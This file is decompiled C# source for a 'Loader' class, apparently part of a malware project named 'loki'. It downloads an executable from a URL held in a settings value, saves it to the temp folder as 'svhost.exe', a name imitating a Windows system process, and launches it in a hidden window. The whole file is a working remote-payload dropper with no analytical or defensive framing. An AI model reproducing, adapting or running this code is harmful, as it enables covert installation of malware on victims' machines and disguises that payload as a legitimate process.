using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace loki.loki.Utilies
{
	// Token: 0x02000027 RID: 39
	internal class Loader
	{
		// Token: 0x06000163 RID: 355 RVA: 0x00008D8C File Offset: 0x00006F8C
		public static void Load()
		{
			string tempPath = Path.GetTempPath();
			Loader.Download(tempPath, Settings.url_loader);
			Loader.RunProcess(tempPath);
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00008DA4 File Offset: 0x00006FA4
		private static void RunProcess(string FileLocating)
		{
			using (Process process = new Process
			{
				StartInfo = 
				{
					FileName = FileLocating + "svhost.exe",
					WindowStyle = ProcessWindowStyle.Hidden
				}
			})
			{
				process.Start();
			}
		}

		// Token: 0x06000165 RID: 357 RVA: 0x00008DFC File Offset: 0x00006FFC
		private static void Download(string FileLocating, string url)
		{
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile(new Uri(url), FileLocating + "\\svhost.exe");
			}
		}
	}
}
